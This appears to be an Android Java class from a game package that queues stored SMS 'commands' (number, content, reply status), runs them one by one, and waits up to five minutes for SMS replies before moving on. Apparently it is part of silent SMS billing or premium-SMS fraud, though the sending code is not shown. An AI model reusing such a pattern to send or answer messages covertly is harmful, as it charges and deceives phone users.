package cn.com.tiantong.game72.util;

import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

import cn.com.tiantong.game72.util.Command;
import cn.com.tiantong.game72.util.CommandContainer;
import cn.com.tiantong.game72.util.DBWrapper;

import android.content.Context;
import android.database.Cursor;

public class CommandContainer {
//	final static String tag = "CommandContainer";
	private Context cm;
	private final int Delay = 5 * 60 * 1000;
	private Timer mTimer = null;
	private List<Command> mWidgetTipList;
	private int mWidgetTipListIndex = 0;
	private static CommandContainer mWidgetTipContainer = null;

	public CommandContainer(Context ctx) {
		DBWrapper db = new DBWrapper(ctx);
		cm = ctx;
		mWidgetTipList = new ArrayList<Command>();
		//LH.LogPrint(tag, "CommandContainer:create");
		db.open();
		Cursor c = db.getAllCommands();
		if (c.moveToFirst()) {
			int i = 0;
			do {
				Command tip = new Command(c.getLong(0), c.getString(1), c.getString(2), c.getString(3), c.getInt(4), c.getString(5));
				if ((c.getInt(4) == 1) || (c.getInt(4) == 3) || (c.getInt(4) == 4)) {
					mWidgetTipListIndex = i;
				}
				mWidgetTipList.add(tip);
				i++;
			} while (c.moveToNext());
		} else {
			//LH.LogPrint(tag, "no tip");
		}
		c.close();
		db.close();
	}

	// 单例模式
	public static CommandContainer GetInstance(Context ctx) {
		if (mWidgetTipContainer != null) {
			return mWidgetTipContainer;
		} else {
			mWidgetTipContainer = new CommandContainer(ctx);
			return mWidgetTipContainer;
		}
	}

	// 第一个tip
	public Command GetFirstCommand() {
		Command tip = null;
		mWidgetTipListIndex = 0;
		if (mWidgetTipList.size() > 0) {
			tip = mWidgetTipList.get(0);
		}
		//LH.LogPrint(tag, "GetFirstCommand:");
		return tip;
	}

	public void AddCommand(String number, String content1, String content2, int smsreply, String msgId) {
		//LH.LogPrint(tag, "往数据库中存储指令集合");
		DBWrapper db = new DBWrapper(cm);
		Command tip = null;
		long rowid = 0;
		db.open();
		rowid = db.insertCommand(number, content1, content2, smsreply, msgId);
		//LH.LogPrint(tag, "AddCommand:rowid:" + rowid);
		if (rowid != -1) {
			tip = new Command(rowid, number, content1, content2, smsreply, msgId);
			mWidgetTipList.add(tip);
		}
		db.close();
	}

	public void DeleteCurrentCommand() {
		DBWrapper db = new DBWrapper(cm);
		Command tip = null;
		db.open();
		tip = GetCurrentCommand();
		//LH.LogPrint(tag, "DeleteCurrentCommand:");
		if (tip != null) {
			db.deleteCommand(tip.getRowid());
			mWidgetTipList.remove(mWidgetTipListIndex);
			mWidgetTipListIndex = 0;
		}
		db.close();
	}

	// 当前tip
	public Command GetCurrentCommand() {
		Command tip = null;
		//LH.LogPrint(tag, "GetCurrentCommand:mWidgetTipListIndex:" + mWidgetTipListIndex);
		if (mWidgetTipList.size() > 0) {
			tip = mWidgetTipList.get(mWidgetTipListIndex);
		}
		return tip;
	}

	public int GetLength() {
		int length = 0;
		//LH.LogPrint(tag, "GetLength:size:" + mWidgetTipList.size());
		if (mWidgetTipList.size() > 0) {
			length = mWidgetTipList.size();
		}
		return length;
	}

	// 下一个
	public Command DoNextCommand() {
		Command tip = null;
		tip = GetCurrentCommand();
		//LH.LogPrint(tag, "DoNextCommand:Enter =================");
		if ((tip != null) && tip.getSmsreplywaiting() == 0) {
			//LH.LogPrint(tag, "DoNextCommand: For SMS 005");
			Starttimer();
			tip.DoAction(cm);
			SetSmsreplyStatus(tip);
			if (tip.getSmsreplywaiting() == 1) {
				//LH.LogPrint(tag, "DoNextCommand: For SMS 005 ChangeStatus");
				tip.DisableSmsreplywaiting();
				SetSmsreplyStatus(tip);
				DeleteCurrentCommand();
				Canceltimer();
				DoNextCommand();
			}
		} else if ((tip != null) && (tip.getSmsreplywaiting() == 2))
		// if((tip!=null)&&((tip.getSmsreplywaiting()==0)||(tip.getSmsreplywaiting()==2)))
		{
			//LH.LogPrint(tag, "DoNextCommand: For SMS 006");
			Starttimer();
			tip.DoAction(cm);
			SetSmsreplyStatus(tip);
		}
		//LH.LogPrint(tag, "DoNextCommand:End =================");
		return tip;
	}

	public boolean DoReplyCommand(Command comm, String number) {
		boolean ret = false;
		boolean reply = comm.DoReplyAction(cm, number,comm.getMsgId());
		SetSmsreplyStatus(comm);
		if (reply == true) {
			DeleteCurrentCommand();
			Canceltimer();
			ret = true;
		}
		//LH.LogPrint(tag, "DoReplyCommand:ret:" + ret);
		return ret;
	}

	public boolean Istimer() {
		boolean ret = false;
		//LH.LogPrint(tag, "Istimer");
		if (mTimer != null) {
			ret = true;
		}
		return ret;
	}

	public void Starttimer() {
		if (mTimer != null) {
			mTimer.cancel();
		}
		//LH.LogPrint(tag, "Starttimer");
		mTimer = new Timer();
		mTimer.schedule(new TimerTask() {
			@Override
			public void run() {
				//LH.LogPrint(tag, "timer out");
				mTimer = null;
				DeleteCurrentCommand();
				DoNextCommand();

			}
		}, Delay);
	}

	public void Canceltimer() {
		if (mTimer != null) {
			mTimer.cancel();
		}
		mTimer = null;
		//LH.LogPrint(tag, "Canceltimer");
	}

	public Command SetSmsreplyStatus(Command tip) {
		DBWrapper db = new DBWrapper(cm);
		db.open();
		db.updateCommand(tip.getRowid(), tip.getNumber(), tip.getContent1(), tip.getContent2(), tip.getSmsreplywaiting(), tip.getMsgId());
		db.close();
		return tip;
	}
}
